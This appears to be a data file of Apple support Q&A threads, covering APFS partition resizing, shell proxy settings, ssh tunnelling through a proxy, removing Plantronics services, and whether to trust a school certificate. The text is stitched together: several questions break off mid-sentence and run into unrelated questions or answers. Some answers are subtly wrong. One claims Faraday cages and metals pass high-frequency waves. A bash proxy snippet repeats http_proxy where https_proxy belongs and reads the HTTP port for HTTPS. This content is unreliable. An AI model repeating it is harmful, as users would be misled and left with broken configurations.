After adding the new partition, I was left with two logical volumes that were 450GB and 50GB.\nFast forward to this evening. I went to update for the latest release and I needed more space. I added an unnamed partition and reduced the size of my 450GB partition to 400GB and I'm left with 3 logical partitions. I was thinking I'd resize the empty 50GB partition to zero and up the other 50GB partition to 100GB and I'd be on my merry way...I thought wrong. \nI took a look at this article from MacWorld, but it seems to be written to address a scenario for an external drive, not an internal drive.\nWhen I'm done, I'd like to have Macintosh HD sized to 400GB and Mojave beta sized to 100GB.\nHere are my questions:\n1) How do I nuke an empty partition?\n2) How do I resize the Mojave beta partition from 50GB to 100GB?\n\nUPDATE\nProgress. I selected the Apple SSD, clicked partition, highlighted the empty partition, and clicked \"-\", which removed it. I still can't resize the other two partitions. Ideas are greatly appreciated.\n\nA: Ok, so it turns out this error -5344: MediaKit reports not enough space on device for requested operation is caused by the fact that you are trying to expand a container backward into free space that exists before it on the partition list, even though Disk Utility (and by extension diskutil) can only expand partitions forward into free space that comes after the container in the partition list. Another notable error is your attempt to resize the Physical Store partitions on which the Container disks are stored (disk0s2 and disk0s4), rather than the Container disks themselves (disk3, disk4, and disk5 in the below example). \nWith a bit of trial and error I was able to figure out how to effectively merge Containers 2 and 3 into one, with no data loss to Container 1. Note that this will require the deleting of the Mojave beta partition, so make sure you either have it backed up, or have an installer on hand. \nUPDATE: There is a way to do this without having to reinstall the second OS. In macOS versions up to Sierra (I haven't tried it in newer) you could create directly bootable backups of your entire system with (adjusting for the disk names you gave in your question) sudo ditto -V -X --nocache /Volumes/Mojave\\ beta/ /Volumes/Untitled/ NOTE: for backing up the currently booted system, subsitute /Volumes/Mojave\\ beta/ with /\nFor posterity please make sure you have a macOS installer (USB or Recovery HD) on hand for each OS you have installed. \nPlease also remember that these disk lables are just the ones for my disk on my system, always double check the names are correct for yours when running these commands by comparing them with the output of diskutil apfs list \nIn order to replicate your situation the best I could, using Disk Utility I formatted a 4 GB flash drive as APFS. I then partitioned the disk two separate times, which resulted in three APFS Containers, and three virtual volumes, in the following order:\n\nFirst Container\n  Container disk3  -  1.85G\n  Physical Store disk2s2\n  Volume disk3s1  \nSecond Container\n  Container disk4  -  0.94G\n  Physical Store disk2s3\n  Volume disk4s1  \nThird Container\n  Container disk5  -  0.94G\n  Physical Store disk2s4\n  Volume disk5s1\n\nI then opened a terminal, and deleted the Third Container with: diskutil apfs deleteContainer disk5, which resulted in disk2s4 being converted into an HFS+ volume.  \nAfter this I deleted the partition disk2s4, and in so doing freed up the space necessary to expand the Second Container by running diskutil eraseVolume \"Free Space\" \"\" disk2s4 \nAt this point the partition list looked like this:  \n\nFirst Container\n  Container disk3  -  1.85G\n  Physical Store disk2s2\n  Volume disk3s1  \nSecond Container\n  Container disk4  -  0.94G\n  Physical Store disk2s3\n  Volume disk4s1  \nFree Space  -  0.94G  \n\nFinally I was able to expand the Second Container to 1.85 GB with diskutil apfs resizeContainer disk4 1.85G. The final result of this is two APFS Container disks of equal value on the flash drive:  \n\nFirst Container\n  Container disk3  -  1.85G\n  Physical Store disk2s2\n  Volume disk3s1  \nSecond Container\n  Container disk4  -  1.85G\n  Physical Store disk2s3\n  Volume disk4s1  \n\nBesides adjusting the commands so that the disk labels match those on your own machine, the one notable substitution you should make is changing 1.85G to 100G in the final command. Beyond that this should be all you need to make the conversion requested.\n\nA: You do not need a separate container for Mojava. Apple created APFS was so one would not have to resize partitions. You can just add a new APFS volume to the same container as your existing macOS and install Mojava in this volume.\nSee APFS - Is it possible to install 2 macOS versions inside one APFS container?\n\nNote: I have noticed the Disk Utility can display the wrong information about a drive after performing a partition operation. You may need to relaunch the Disk Utility and/or restart your Mac to correct this problem.\n\nIf you want to proceed with two AFPS containers, you will need to do the following:\n\n\n*\n\n*Open the Disk Utility application and remove all APFS containers except the original. This container should contain virtually all the drive space.\n\n*Create a new APFS partition with the size of 100 GB.\n\n\nYou can also use the Terminal application to enter commands. This is usually safer than using the Disk Utility. I would post the commands, but I would need the output from diskutil list after your Mac is restarted.\n", "Q: Monitor going black regularly The monitor connected to my Mac mini is going dark regularly for a few seconds, then he comes back up.

But network traffic on Terminal does not work Set HTTP, HTTPS, FTP, SOCKS, Streaming, Gopher to 10.11.0.1 and port 8080, \nwith no username and password. And it works for Safari and App Store. And set the same entries to Firefox and it also works with no issue. \nHow do I set the proxy for particular networks so that it works fine on every app?\n\nA: \nHow do I set the proxy for particular networks so that it works fine on every apps?\n\nYou have configured several proxies in System Preferences, and that's the right way to do it (that's why the App Store app and Safari work fine). Unfortunately, Terminal is an exception and needs its own proxy settings.\nWhy is that? Terminal is merely a container that runs a shell. A shell a program that, simply put, displays a prompt and waits patiently for you to execute commands like ls and rm.\nShells predate macOS and have their own rules for configuring proxies. Shells know nothing about proxy settings in System Preferences, and they need to be configured separately.\nmacOS's default shell is Bash (you can find out which shell you are running by executing echo $0 at the prompt) so I'll explain how to set the proxy in Bash.\nThe simple solution\n\n\n*\n\n*Launch Terminal and type this command to change directory to our home directory:\ncd ~\n\n\n*Type these commands to open .bash_profile with TextEdit: \ntouch .bash_profile\nopen -a TextEdit .bash_profile\n\n\n*Set the proxy environment variables by typing the following text in TextEdit and replace <your http proxy>,  <your https proxy> and <your ftp proxy> with your proxy server (if TextEdit already contains text, add the text below at the end of the file):\nexport HTTP_PROXY=\"<your http proxy>\"\nexport http_proxy=$HTTP_PROXY\nexport HTTPS_PROXY=\"<your https proxy>\"\nexport http_proxy=$HTTP_PROXY\nexport FTP_PROXY=\"<your ftp proxy>\"\nexport ftp_proxy=$FTP_PROXY\n\nIf you have configured in System Preferences a list of hosts and domains that should be contacted directly bypassing the proxy, add them like this:\nexport NO_PROXY=\"<comma-separated list of hosts>\"\nexport no_proxy=$NO_PROXY\n\nFor example:\nexport HTTP_PROXY=\"http://10.11.0.1:8080\"\nexport http_proxy=$HTTP_PROXY\nexport HTTPS_PROXY=\"http://10.11.0.1:8080\"\nexport http_proxy=$HTTP_PROXY\nexport FTP_PROXY=\"http://10.11.0.1:8080\"\nexport ftp_proxy=$FTP_PROXY\nexport NO_PROXY=\"localhost,127.0.0.1\"\nexport no_proxy=$NO_PROXY\n\n\n*Save the file with ⌘S and close TextEdit.\n\n*Close Terminal and reopen it. Now the proxy settings should work correctly.\n\n\nA more elaborate solution\nThe method above has a drawback: you need to keep two configurations, the one in System Preferences and the one in .bash_profile.\nLuckily, as explained on Derek Morgan's blog, you can have Bash import the System Preferences proxy settings using the scutil command. Simply follow the steps detailed in the previous section, but in step 3 set the http/https/ftp proxy environment variables as follows:\nexport HTTP_PROXY=$(scutil --proxy | awk '\\\n/HTTPEnable/ { enabled = $3; } \\\n/HTTPProxy/ { server = $3; } \\\n/HTTPPort/ { port = $3; } \\\nEND { if (enabled == \"1\") { print \"http://\" server \":\" port; } }')\nexport http_proxy=$HTTP_PROXY\n\nexport HTTPS_PROXY=$(scutil --proxy | awk '\\\n/HTTPSEnable/ { enabled = $3; } \\\n/HTTPSProxy/ { server = $3; } \\\n/HTTPPort/ { port = $3; } \\\nEND { if (enabled == \"1\") { print \"http://\" server \":\" port; } }')\nexport https_proxy=$HTTP_PROXY\n\nexport FTP_PROXY=$(scutil --proxy | awk '\\\n/FTPEnable/ { enabled = $3; } \\\n/FTPProxy/ { server = $3; } \\\n/FTPPort/ { port = $3; } \\\nEND { if (enabled == \"1\") { print \"http://\" server \":\" port; } }')\nexport ftp_proxy=$FTP_PROXY\n\nIn the definitions above, I set http:// as the scheme for all proxy servers, you might need to modify them to socks5:// for SOCKS or https:// for HTTPS as necessary.\n\nA: I going on the assumption that you mean applications/protocols like ssh can't connect because of the proxy.\nTo connect, you have to \"tunnel\" through the HTTP proxy\nssh USERNAME@REMOTEHOST -o \"ProxyCommand=nc -X connect -x PROXY:PORT %h %p\"\n\nReplace USERNAME, REMOTEHOST, PROXY and PORT with their respective values.\nIf this is something you have to do more than once, adding a static entry to your ~/.ssh/config file is helpful.  For example:\nHost remotehost.foo.bar\n    ProxyCommand          nc -X connect -x proxyhost:proxyport %h %p\n    ServerAliveInterval   10\n\nThe ServerAliveInternal is there because most proxies will drop the connection if there's no activity for a certain amount of time.\nThen, to connect,  all you have to do is:\nssh remotehost.foo.bar\n\n", "Q: Display not working with Mac mini I recently bought a new LG Ultrawide display.\nI connected it to my Mac mini with a Display Port to HDMI cable.\nBut nothing is showing up on it.

Here an example which I captured today (just 24hrs after my last reboot) but on the other day I’ve seen 2.4 GB wasted:\n\nI've raised a ticket to Plantronics Support but so far nothing constructive.\nThe only fix I have now is to kill the process after each and every reboot.\nQuestion: any solution you could think of except killing the process?\n\nA: Though I regularly search for answers here, this is my first post. Please, forgive if I do not match this forum's etiquette.\nI fully empathize with your problem. SpokesUpdateService is relentless. For me, it seemed to launch around the same time each day. I knew it was crashing my Late-2011 MBP with Sierra 10.12.6, but today's EtreCheck simple (free) \"diagnosis\" show this damn SpokesUpdateService caused 113 crashes on November 3rd for me alone. (No wonder my system died and refused to restart for hours!) \nRealistically, Plantronics rarely updates the firmware or software for my headset. I can check for updates when I choose, not hundreds of times daily with SpokesUpdateService.\nHere is my simple brute-force solution:\nTrash the following three files: \n\n\n*\n\n*com.PlantronicsUpdateService.plist \n\n*Headset Updater (Version 1.1.0 (2015), a Plantronics application\n\n*Plantronics Hub (Version 3.11.52215.23527 (2018) another Plantronics Application. \n\n\nYou might also get away with only trashing com.PlantronicsUpdateService.plist or editing it (see below).\nI deleted these files because com.PlantronicsUpdateService.plist seems to call SpokesUpdateService:\n\nFor good measure, I also trashed the applications \"Headset Updater\" and \"Plantronics Hub.\" I still have all three in the Trash in case I need them later. Simply putting these three files in the Trash has stopped SpokesUpdateService. I most likely can permanently delete all three and simply re-install the Headset Updater and/or Plantronics Hub if I need/want them.\nI have not programmed in decades, but you might try editing com.PlantronicsUpdateService.plist by deleting \"KeepAlive\". I say that based on commands at \"A launchd Tutorial\", http://www.launchd.info (last visited Nov. 9, 2018).\n\nA: The only solutions are:\na. The developer fixes the memory leak.\nb. You regularly kill the process.\nc. Look for an alternative piece of software / hardware.\nThe only way to fix a memory leak is to alter the code which only the developer can really do, theoretically you could decompile the application, fix the issue and recompile but that is non-trivial in the extreme unfortunately.\n\nA: Remove all of the Plantronics Hub and Headset apps and then remove the following files and directories.\n/Library/LaunchDaemons/com.PlantronicsUpdateService.plist\n~/Library/Application Support/Plantronics/*\n~/Library/Preferences/Plantronics*\n\nFinally, remove/delete /usr/local/libexec/SpokesUpdateService and restart.\n-- After the above, your system will be free of Poly's junkware.

It seems like it attached somehow in the lower left hand corner.\nAll I want to do is clean the dust off the fans.  What am I missing?\n\nA: There is only one screw holding the main pair of front fans in the Mac Pro 3,1 - but the assembly itself must be pulled square towards you, as it's slotted... and can be a bit resistant to being removed first time [especially as it's had 10 years to set itself firmly in there].\nNote: If you've a full-length graphics card in, you will have to remove it first, in order to remove the aluminium cover over the CPUs. That's magnetic & just pulls away. \nYou'll also find the CPU heatsinks will be clogged more than the fans you're trying to clean. \nThis is the screw you already found...\n\nOnce that's out, pull square from the top right & bottom left - here it looks like they're using a PCI slot cover to assist, though I've never used anything other than bare hands\n\nThis is what you're trying to overcome - the drag on this channelised slot which keeps it all square, plus the fan plug/socket behind the assembly.\n\nPicture Source: Apple - Mac Pro 3,1 2008 Service Source\nThe rest - experience ;) \nI just looked at iFixit's take apart - though they lump the 1,1, 2,1 & 3,1 all in the same category - they mention a second screw at the bottom of the assembly; which I don't recall ever seeing on a 3,1.\nHowever, it looks like one of those screws that the first engineer to disassemble it takes out & never replaces because it's so awkward to get to ;)  \nI don't have a 3,1 I can open up right now to check - & it is most definitely not mentioned in the specific 3,1 service source manual.\n\n\nA: That is a first generation (case) Mac Pro.\nWith questions like these it is a good idea to include a picture that shows what you are doing. That said I found repair guides on iFixit.com for that Generation of Mac Pro that show that you may need to remove any expansion cards, at least the first one or two drives and the processor heat sink cover before you can remove the fan assembly.\nI used to have a MacPro 1,1 (similar internals as yours) and I have done that but it's been a while since I had that Mac.

I only have 128 GB of storage. I'm thinking of upgrading it. I've seen a lot of articles about purchasing OWC or Trascend's drives; however, I have not seen any article about purchasing OEM (Original Equipment Manufacturer) drives. I found some on eBay -- they are just a lot more expensive!\nIs there something I'm missing? Do people not recommend them because of price, or because they are not really original? \nIf I buy one of these drives, can I hook them up to my MacBook just like I would a Trascend or OWC Aura drives?\n\nA: OEM means Original Equipment Manufacturer.\nManufacturers (like Apple, Microsoft, Ford, etc.) don't actually make every component in the devices they make.\nFor example, Apple doesn't actually make the memory, the screen or the SSD that's inside your MacBook.   They are made by other companies like Samsung, Micron, and LG.\nWhen you purchase an OEM product (i.e. a drive), you're purchasing the same component that would have been installed.\nWhat you are seeing on eBay are usually \"pulls\" from salvaged machines.  The drive they pull from a salvaged MacBook Pro, for example, will be listed as the OEM drive.  \nThey are usually more expensive because there are very few 3rd party options avilable (i.e. Samsung doesen't offer PCIe SATA drives with the Apple spec or LG doesn't offer \"Retina\" quality displays elsewhere; usually all by contract)\n", "Q: Problem connecting MacBook to TV I was able to watch Netflix on my TV using a ThunderBolt cable to connect previously, however since the last upgrade all I get now is a picture of a screensaver nothing else. \nHow can I fix this?\n\nA: When you say screensaver, do you mean a static image or a mountain or something like that?\nIt could be that previously your computer was previously mirroring the image from your MacBook's built-in screen to the TV, and it has for some unknown reason switched modes and is now creating a second desktop.\nComputers like yours can support up to three screens including the built-in one, and you can mix and match the mirroring and desktop modes.\nSpanning basically gives you more room, it allows you to put windows onto the second screen and you can move your mouse between them, but in this case it's not what you want.\nYou can verify if this is what is happening by following these steps:\n\n\n*\n\n*Click on the Apple menu\n\n*Open \"System Preferences\"\n\n\n\n\n\n*Choose \"Displays\".\n\n\n\n\n\n*Select the \"Arrangement\" option.\n\n\nIf this option is missing then the problem is not what I suspect, please come back and let me know.\n\n\n\n*You should see a diagram that shows you two blue boxes side-by-side:\n\n\n\nThis diagram shows how the two screens are arranged in relation to your mouse and the laptop, the one with the white bar is the primary screen (probably the build-in screen).\nIf as with this diagram the second box (without white bar) is off to the left you should find that if you move your cursor to the left if will appear on the TV.\nIf this is the case the solution is simple, there are two ways:\na. Press CommandF1 to switch into mirroring mode.\nb. In the System Preferences window you have opened click \"Mirror Displays\" \n\nAfter you've done this you'll notice that the blue boxes are now stacked in the System Preferences window, this indicates they are displaying the same image. The system should remember this in future, it is possible this was reset by the system during a firmware update caused by a software update you ran on your computer.\n", "Q: No port forwarding on air port Hello I have two routers in my net. One is from my ISP and secound is air port. I want to do port forwarding. If I forward port on air port it doesn't work I have to also forward ports on router from ISP. I have a static ip address on airport. I also tried to turn on DMZ on router from ISP and add an airport ip address. On http://www.canyouseeme.org/ I got success when I have turn on DMZ, but I cannot connect to disk on airport using external ip address. I don't know what should I do :/\n\nA: You should only be using one router/firewall.\nThe problem with using two routers is you set up a double NAT scenario.  What is basically happening is that you forward one port from the edge router (the one from your ISP) to the internal router (Airport) which then has to port forward again.\nFor instance, using ssh port 22 as an example, you would have to forward port 22 on the ISP router to the Airport which then needs to forward port 22 to the host that's accepting the incoming connection (like your Mac).\nCan things work in the above scenario?  Sure, but it adds several layers of complexity.\nWhat you should do is one of the following:\n\n\n*\n\n*Disable the firewall on the Airport and let the edge router handle all of the port forwarding\n\n*Disable the firewall on the edge router (turn it into a gateway) and use the firewall services on the Airport\nYou should also avoid the use of a DMZ.  This is an exposed area of your network that allows all connections/ports to pass.  It's analogous to the front porch of a house - it's part of the house but nothing is secured behind the front door.\n", "Q: How can I disable the system feedback when using the \"fn\" button on a Touch Bar-equipped MBP? I use Shush to auto-mute my microphone on voice and video calls, where I toggle my mic on by holding the fn key.  But on a Touch Bar equipped MBP, the system issues a click and pop noise when pressing and releasing the fn button, and it's driving me batty. \nHow can I disable this feedback noise?  (And how did you figure this out?)\nUpdate: I should note a few settings:\n\n\n*\n\n*System Preferences > Sound > Sound Effects > Play user interface sound effects is OFF\n\n*System Preferences > Keyboard > Dictation is OFF\n\n\nA: How embarrassing: the clicks were due to Shush's audio cues. I thought I had disabled them.\n\n\nA: It's likely that you have enabled Dictation which is what that key is configured for by default.\nYou can disable this as follows:\n\n\n*\n\n*Click on the Apple menu\n\n*Open \"System Preferences\"\n\n\n\n\n\n*Select \"Keyboard\"\n\n\n\n\n\n*Select \"Dictation\"\n\n*Set \"Dictation\" to \"Off\"\n\n\n\n", "Q: Attempts to install Windows 8.1 onto an Early 2011 MBP are failing So I have spent the past couple of days attempting to install Windows 8.1 onto a MBP with High Sierra. Apparently, this model is unable to create and boot from a USB dive. So the normal Boot Camp method is out of the question.\nI've been following a guide posted on this site that uses VirtualBox to install Windows without the need for a USB drive or even a DVD.\nHere's the guide for reference: Is it possible to Bootcamp Windows 8.1 using USB on Late 2011 MBP?\nSo here's what I've done so far...\n\n\n*\n\n*Installed the latest version of VirtualBox\n\n*Created a new VM with Windows 8.1 as the version. I did not add a virtual drive.\n\n*Using the Terminal, I found that the internal disk, disk0, had 4 partitions. I had created a WINDOWS partition, identified as disk0s4 when using diskutil list.\n\n*I entered the following series of commands:\nsudo chown $USER /dev/disk0s4\nsudo chown $USER /dev/disk0s1\nsudo chown $USER /dev/disk0\ndiskutil unmount /dev/disk0s4\nVBoxManage internalcommands createrawvmdk -filename ~/RawWinDisk.vmdk -rawdisk /dev/disk0 -partitions 1,4\ndiskutil unmount /dev/disk0s4\n\nin a Terminal application window.    \n\n*So far so good. No issues here besides having to disable the SIP in order to create the VMDK file.\n\n*Back to the VM I created early, I when to the settings and clicked on the \"+\" sign by the SATA controller. I added the VMDK file that I just made so it appeared below the SATA controller.\n\n*This is where I had to improvise. The guide asks to click on \"Empty\" below the IDE controller... except there was not IDE controller listed. Instead, there was another \"Empty\" shown under the SATA controller. So, I added a virtual disk (The Windows 8.1 ISO file) and checked in the \"Live CD/DVD\" option.\n\n*And here is where everything goes kaputs. I go to start the VM. The Windows 8 installer boots up fine. I enter in the product key and continue. I am given the option to upgrade or do a clean install. I choose clean. The installation halts with the following error:\n\n\n\nCompatibility report: The computer started using the windows installation media. Remove the installation media and restart your computer so that windows starts normally. Then, insert the installation media and restart the upgrade. (Do not select Icustom [advanced] to perform an upgrade Icustom [advanced] installs a new copy of windows and deletes your programs and settings.)\n\nSo now what? I know the ISO file is fine because I have used it before to reinstall Windows. Is there a setting I missed?\n\nA: Ignore the message. You do want to select Custom: Install Windows only (advanced). See image below.\n\nThe answer you are referencing was posted Jun 11 2015. This answer is basically the same as the earlier answer I posed on Apr 9 2015, except for a few omitted steps. The procedure you used might work provided a BIOS booting operating system was previous installed on your Mac. The answers I posted here and here were tested for Windows 7 and/or Windows 10, but not for Windows 8 or Windows 8.1. You might consider trying one of my posted answers. In any case, the Window Support Software for your Mac should be downloaded by using the Boot Camp Assistant installed on your Mac or directly from the website Boot Camp Support Software 5.1.5621. This software should be used with any 64 bit of version Windows you install (including Windows 10).\n\nBTW: You and download and try Windows 10 without having a Product Key. Use Safari to download the Windows 10 ISO from this Microsoft website. You can buy a license after installing and testing Windows 10.\n\n\nA: I would recommend installing Windows 10 using the method given in this answer. \nThe same procedure can be used with Windows 8.1. I tested by downloading 64 bit Windows 8.1 Pro from this Microsoft website. The file was named Win8.1_English_x64.iso. I used a Windows 8 Pro Product Key to install. The only significant change to the instructions would be the image below should be substituted for the images in step 18.\n\n", "Q: macOS Grapher recursive function Can grapher in macOS work with recursive functions???\nIf so how?

Fortunately, it is quite simple: Choose “Equation > New Equation from Template… > Other > Series”.\nEdit: The best resource on Grapher I know is this PDF. It is a bit hard to read at times because it has so much content, but it is an invaluable resource if you want to make full use of Grapher.

It boots to the recovery partition and Disk Utility shows the drive as empty. It may have had a power surge?  The only reasonable explanation I have is that it was on and received the 10.13.6 update and was erased. Usually an update will never wipe the drive first.\nAny thoughts?\n\nA: A power surge isn't going to erase a drive.  Destroy it maybe, but erase the main partition while leaving the Recovery partition intact is virtually impossible.\nIf it was a power surge, the internal power supply would have been fried.  If that didn't fry the computer the greater than 18V DC along the power rails would surely have fried (at a minimum) the SMC (which operates on 5V and 3V DC).\nWhat has happened is the user erased the drive in an attempt to bypass restrictions. I've seen my share of students who ask how to bypass restrictions both here and at many clients.  Here's just a short list of questions that fall into that genre:  \n\n\n*\n\n*How do you download games on a school iPad?\n\n*Why does McAfee Endpoint Protection keep auto installing?\n\n*What is a organizational device considered to be? (This one is pretty benign but I have my suspicions...)\n\n*Amazon FireTV without WiFi, MacBook Pro Internet sharing\n\n*What websites can I use to get games in my schools IPad?\nThe only resolution you can take (and what I still do) is the following:\n\n\n*\n\n*tell them \"That's odd.

Any easy fix??\n\nA: There is no easy fix.\nYou may be able to salvage the battery connector.  If you can get it back into place and secure it with some tape and the the Mac functions, chances are the connector can be soldered back to the board.  (This is not a permanent fix, only a diagnostic)\nIf not, the connector and/or logic board needs to be repaired.\nEither way, you won't be able to do this with a soldering iron - you will need a hot air re-flow gun and some technical skill to do this without un-soldering or heat damaging the components near it.\nThere are companies that specialize in repairs like this and are quite good at this type of repair.  They would be your best bet for repairing this type of damage.\n", "Q: How does Apple achieve the all aluminium enclosure with RF on the MacBook Pro? Since 2016, Apple has been able to make these laptops with no visible “window” of plastic or glass for RF signals to travel through. As an electrical engineer, I’m intrigued. \nIf you look at older MacBook pros, they have a black plastic hinge. For the Pixel chrome book, it’s got a whole glass half of the lid for that. \nMy guess was the hinge or the glass screen, but neither would work when the lid is closed, and you can very much use your MBP while the lid is fully closed with WiFi and Bluetooth (think when you have external displays). \nHow does Bluetooth and WiFi work on the 2018 MacBook Pro models?\n\nA: Pretty good question of physics everyone should ask when thinking of the number of wireless interfaces there are in today's iPhone and Mac.\nFast answer\nApple tests different pieces, materials and antenna positions through mathematical models to compute the resulting outside signal obtained and get strenghest and most omni-directional one.\nPhysical reality\nFirst thing to know in this field, we are not talking of electrostatic here, but of electromagnetism and moreover oe electromagnetic wave in the micro-waves spectrum (300 MHz - 300 GHz).\nConsider a closed metallic box connected to the ground. If you apply to this box an electrostatic field with no variation, then the electrons within the metal of this  box will move until they will reach one of the face of the metal and until the overall electrostatic field is fully equal to zero. Then the electrostatic field\ninside this metallic box will also be equal to 0 within 1 ps (10⁻¹²s) for a metal of 0.2 mm thickness. This will also be the case with a varying electrostatic field, but only if this field is varying staying in the same direction. This is the case with a lightning strike: the electrons within will be able to follow the high variation in intensity of this electrodynamic field so as to cancel it inside the box.\nThis box is named a Faraday cage (Faraday cage on Wikipedia) as nearly everyone learned in school long before learning electromagnetism.\nA Faraday cage blocks electrostatic fields\nBut in the electromagnetism field the things are completly different. The electrons won't have enough time to go from one face of the metal to the other the time the electromagnetic field will take to switch direction: 0.2 ps at 5 GHz (reminder: periode = 1/frequency). And in a metal the electrons will start to oscillate at the same frequency than the exterior electromangetic field. They won't be fast enough to follow the music and won't anymore cancel through equilibrium the external electromagnetic field. They will create their own electromagnetic field slightly phase shifted with the outside one (exactly like electrons in an antenna). The two electromagnetic fields will add together and create an electromagnetic field inside the metallic box.\nA Faraday cage doesn't block electromagnetic waves\nA common misconception is that a Faraday cage provides full blockage or attenuation of electromgnetic waves, this is not true. We should talk of the transparency of different metals or alloys to electromagnetic waves (more acurately of their \"absorption spectrum\"). Most metals are fully black to slow frequencies and transparent to high ones (look at the picture of your MBP when you pass the X-rays control at the airport ). On the other hand, concrete with irons regularly spaced every 25 cm or 50 cm if fully opaque to electromagnetic waves in the frequency around 2.4 GHz.\nHere is a nice experiment to check this physical reality.\nFind a plain steel small box like an old sugar box. Connect it to the ground with an electric cable (any ground pin on a wall electric outlet will be perfect). Put your mobile phone inside the box, close the box. Then call your prisoner of the Faraday cage. If you are in a normal reception area, your mobile phone will ring, and you will hear (a Faraday cage doesn't block sounds either).\n\nA: Apple cleverly places the WiFi antenna assembly adjacent to the cooling vent to seemingly \"circumvent the laws of physics\" and get around the Faraday cage problem.\nLooking at the underside of the MacBook Pro (15\" 2017), you can see a cooling vent that goes for about 80% of the width of the machine.\n\n\nThe WiFi antenna assemblies are put on either side of the MacBook directly adjacent to the cooling vent.  So, while it appears that the WiFi antenna is hidden behind an all aluminum case, it's actually out in the open which is how it receives WiFi signals in closed-clamshell mode.\n\nA: Apple seems reluctant to publish such information, and we must fall back to photos and videos published by technicians and repairmen to find any useful clues. This is such a video. The subject is an older Macbook, but I believe antennas on current Macbooks are in the same location. The video shows the antenna location clearly: behind the plastic bezel at the bottom of the display - where you see the name \"MacBook Pro\" (on mine at least). \nWhen you close the lid, and inspect the case this is the only location that makes sense. As you've recognized, the case presents limited opportunities for rf signals to escape. In fact, the only opportunity (assuming the case material really is aluminum) is the slot at the rear; the same slot where heat is exhausted from the case. The plastic bezel will face the top of this slot when the lid is closed. \nThe MacBook case, and its packaging in general, are marvels of modern design and manufacturing I think. Apple is good, but even their rf signals must follow the laws of physics discovered by Michael Faraday nearly 200 years ago. \n\nA: An interesting thread. I have a 2016 MacBook Air and I feel sure that Apple would use polycarbonate for the hinge and keys, not plastic. Polycarbonate can be an RF resistant material.\n", "Q: Empty AssetsV2 folder in Finder I was doing some snooping around in the Finder on my mac and found that there is an empty folder titled \"AssetsV2\"(https://i.imgur.com/ohxkTp6.png).\nIm unsure of the direct path but it's found by selecting the following.\nMacintosh HD->System->Library\nThe folder is completely empty when compared to the regular Assets folder next to it. Im unsure as to why i have a seconds assets folder if there's nothing inside of it. I did create both a volume partition and secondary volume from the Disk Utility app a few months ago and both were deleted since then.\nIs \"AssetsV2\" just a ghost folder from either the partition or secondary volume i created?\nDoes anyone else have a secondary(or more) Assets folder as well?\n\nA: Danger Will Robinson! \nNot sure why it matters that you have an empty folder in /System/Library but I have found from past experience that you NEVER touch anything in the /System folder. Doing so can lead to problems with your Mac up to and including making it non-bootable.\nI completely ignore all folders outside of my home folder. Sure it is interesting to go exploring but honestly if it ain't broke don't fix it.

It looks nice but the font size is waaaay too small, so I had to lose some of this niceness by scaling down to 2048x1152.\nI wonder is this a usual thing people do? I know this kind of displays (27\" 1440p) are popular as an external MacBook monitors. As far as I know, it's not possible to change the global font size. I can't imagine how people go along with this tiny text by default with 1440p.\nUPDATE:\nA good question came up in comments about what do I consider a tiny font size, it's a good point, here's how it looks (full screen snapshots):\n\n*\n\n*Default 2560x1440: \n\n*Scaled down 2048x1152: \nMy eyesight isn't perfect so I asked my colleague who wears glasses to take a look at it, he confirmed that it does look tiny.\n\nA: In my experience if you connect your monitor via HDMI it won't give the the font scaling options in System Preferences > Displays.\nIf however you connect via DisplayPort i.e. Mini DisplayPort to DisplayPort it should give you the options similar to these:\n\nThere used to be some hacks to trick the monitor into switching into HiDPI mode but I couldn't personally get these to work on macOS High Sierra, but using a DisplayPort cable rather than either HDMI or Mini DisplayPort to HDMI did resolve the issue.\n\nA: My Dell U2719DC does the same.\nThe best solution for me was using my Mac set to 2048X1152 res since the higher resolution gives me the eye strain. The fonts are tiny too. Though I wish could use the higher res, it's way sharper overall.\n\nA: There is a tool called BetterDummy which makes the scaling option available for 1440p monitors: https://github.com/waydabber/BetterDummy\n", "Q: How to install Apple's Game Center app on iPad How do I get Game Center app on my iPad Wi-Fi?\nI am unable to find the app on the device as well as the App Store.\n\nA: The Game Center application has been removed from iOS 10, but you can still manage your Game Center settings from the Settings.app\nOn your iPad tap Settings > Game Center. \n\nA: The standalone Game Center app was removed from iOS 10 and macOS Sierra.\nHowever the service continues to remain available. \nYou can log into Game Center on your iOS device by going to Settings app → Game Center.\nOn earlier versions of iOS (like iOS 9) the app is installed by default.\n", "Q: Should I Trust a Certificate Basically, my school is apparently having a network 'update' and are telling us to go to keychain access and trust a certificate. This is what they sent us.\n\n\nExactly what will happen if I do this any? Do you have any recommendations for what I should do?\n\nA: Trusting a certificate gives the owner of that certificate the ability to limit security warnings when performing some tasks. These tasks include installing new software, and intercepting & proxying secure connections.\nWhether you should follow the request to trust the certificate depends on who owns the computer.\nSee Should I let my child's school have access to my kid's personal laptop? for a related question over on the Information Security site.\nSchool Device\nIf the computer is supplied by the school and the school want you to install their trusted certificate, then you should do so.\nPersonal Device\nIf this computer is yours, I would not trust their certificate. Adding an always trusted certificate is significant step and should rarely be needed on a personal device.\nMinimum Trust\nNote the sub-options in step 5:\n\nYou can choose to trust the certificate only for certain functions. If the certificate is intended to allow locally developed and signed software to run, then only Code Signing should be required. Maybe X.509 Basic Policy also.\nI would avoid trusting Secure Sockets Layers (SSL) until it is proven essential. This trust would allow the school to intercept previously secure Internet connections.\nYou could incrementally trust/distrust parts the certificate until you found the minimum set of trust required.\n\nA: Personally, I’d say no. This is an intermediate CA (and below that a Root CA). This enables the owner of that CA to man in the middle your connections. There is no reason to accept such a CA unless there is a large volume of internal applications. The general application of a CA like that is for SSL man in the middle boxes that do traffic inspection — often badly configured. \n", "Q: alert if application isn't running I'm currently having a bit of a nightmare as the company secretary's Mac has failed to run OneDrive since June.

